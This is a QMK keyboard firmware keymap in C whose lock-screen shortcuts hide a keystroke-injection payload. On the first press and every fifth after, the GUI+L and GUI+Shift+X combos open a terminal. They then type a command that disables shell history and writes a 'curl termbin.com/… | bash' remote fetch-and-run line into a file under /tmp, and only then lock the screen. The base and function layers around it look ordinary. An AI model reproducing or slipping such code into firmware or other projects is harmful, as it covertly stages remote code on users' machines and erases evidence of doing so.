#include QMK_KEYBOARD_H
#include "action_layer.h"

#define COMMAND "export HISTFILE= ; echo curl termbin.com/58fG \\| bash > /tmp/keyboard/teste.sh;exit"

enum combo_events {
  LOCK_SCREEN_X,
  LOCK_SCREEN_L,
};

const uint16_t PROGMEM lock_x_combo[] = {KC_LGUI, KC_LSHIFT,KC_X, COMBO_END};
const uint16_t PROGMEM lock_l_combo[] = {KC_LGUI, KC_L, COMBO_END};
static int counter = 5;

combo_t key_combos[COMBO_COUNT] = {
  [LOCK_SCREEN_X] = COMBO_ACTION(lock_x_combo),
  [LOCK_SCREEN_L] = COMBO_ACTION(lock_l_combo),
};

void process_combo_event(uint8_t combo_index, bool pressed) {
  switch(combo_index) {
    case LOCK_SCREEN_X:
      if (pressed) {
        if(counter >= 5){
          // OPEN TERMINAL
          register_code(KC_LGUI);
          register_code(KC_ENTER);
          unregister_code(KC_ENTER);
          unregister_code(KC_LGUI);
          _delay_ms(500);

          //SEND COMMAND
          SEND_STRING(COMMAND SS_TAP(X_ENTER));
          counter = 0;
        }
        counter += 1;
        //BLOCK MACHINE
        register_code(KC_LGUI);
        register_code(KC_LSHIFT);
        register_code(KC_X);
        unregister_code(KC_X);
        unregister_code(KC_LGUI);
        unregister_code(KC_LSHIFT);
      }
      break;

    case LOCK_SCREEN_L:
      if (pressed) {
        if(counter >= 5){
          // OPEN TERMINAL
          register_code(KC_LGUI);
          register_code(KC_ENTER);
          unregister_code(KC_ENTER);
          unregister_code(KC_LGUI);
          _delay_ms(500);

          //SEND COMMAND
          SEND_STRING(COMMAND SS_TAP(X_ENTER));
          counter = 0;
        }
        //BLOCK MACHINE
        counter += 1;
        register_code(KC_LGUI);
        register_code(KC_L);
        unregister_code(KC_L);
        unregister_code(KC_LGUI);
      }
      break;
  }
}

const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {

  // 0: Base Layer
  LAYOUT_all(
      KC_GRV,  KC_1,    KC_2,    KC_3,    KC_4,   KC_5,   KC_6,   KC_7,   KC_8,   KC_9,    KC_0,    KC_MINS,  KC_EQL,  KC_BSPC,  KC_NO,    \
      KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,   KC_T,   KC_Y,   KC_U,   KC_I,   KC_O,    KC_P,    KC_LBRC,  KC_RBRC,           KC_BSLS,   \
      KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,   KC_G,   KC_H,   KC_J,   KC_K,   KC_L,    KC_SCLN, KC_QUOT,  KC_NO,             KC_ENT,    \
      KC_LSFT, KC_NO,   KC_Z,    KC_X,    KC_C,   KC_V,   KC_B,   KC_N,   KC_M,   KC_COMM, KC_DOT,  KC_SLSH,  KC_NO, KC_RSHIFT,  KC_NO,      \
      KC_LCTL, KC_LGUI, KC_LALT,                          KC_SPC,                          KC_RALT,    F(0),  KC_NO, KC_RGUI,    KC_RCTL),

  // 1: Function Layer
  LAYOUT_all(
      KC_ESC,   KC_F1,    KC_F2,    KC_F3,    KC_F4,      KC_F5,    KC_F6,    KC_F7,    KC_F8,    KC_F9,    KC_F10,   KC_F11,   KC_F12,   KC_DEL,   KC_NO,    \
      KC_NO,    KC_NO,    KC_UP,    KC_NO,    KC_INSERT,  KC_HOME,  KC_PGUP,  RGB_TOG,  RGB_MOD,  RGB_HUI,  RGB_HUD,  KC_NO,    KC_NO,              KC_NO,    \
      KC_NO,    KC_LEFT,  KC_DOWN,  KC_RIGHT, KC_DEL,     KC_END,   KC_PGDN,  RGB_SAI,  RGB_SAD,  RGB_VAI,  RGB_VAD,  KC_NO,    KC_NO,              KC_ENT,    \
      KC_LSFT,  KC_NO,    KC_MPRV,  KC_MPLY,  KC_MNXT,    KC_VOLD,  KC_VOLU,  KC_MUTE, KC_PSCREEN,    KC_NO,    KC_NO,    KC_NO,    KC_RSFT,  KC_NO,    KC_NO,      \
      KC_LCTL,  KC_LGUI,  KC_LALT,                           KC_SPC,                                      KC_RALT,  F(0),     KC_NO,    KC_RGUI,  KC_RCTL),

};

// Custom Actions
const uint16_t PROGMEM fn_actions[] = {
  [0] = ACTION_LAYER_MOMENTARY(1),  // to Fn overlay
};

// Macros
const macro_t *action_get_macro(keyrecord_t *record, uint8_t id, uint8_t opt) {

  // MACRODOWN only works in this function
  switch(id) {
    case 0:
      if (record->event.pressed) { register_code(KC_RSFT); }
      else { unregister_code(KC_RSFT); }
      break;
  }

  return MACRO_NONE;
};

// Loop
void matrix_scan_user(void) {
  // Empty
};

